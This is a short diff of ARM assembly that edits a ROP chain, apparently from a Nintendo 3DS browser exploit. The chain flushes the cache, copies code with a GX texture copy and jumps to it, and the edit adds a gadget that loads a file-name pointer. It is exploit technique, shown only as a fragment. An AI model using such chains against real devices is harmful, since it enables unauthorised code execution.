@@ -17,9 +17,10 @@ _start:
 	rop_flush_data_cache(BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
 	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
+	.word POP_R0_PC, ROP_LOC+FileName
 	rop_jump_arm
 @.org 0x0F4, GARBAGE
-	.fill 3, 4, GARBAGE
+	.fill 1, 4, GARBAGE
 	.word ROP_LOC+_start+0x8C
 @.org 0x128, GARBAGE
 	.fill 12, 4, GARBAGE
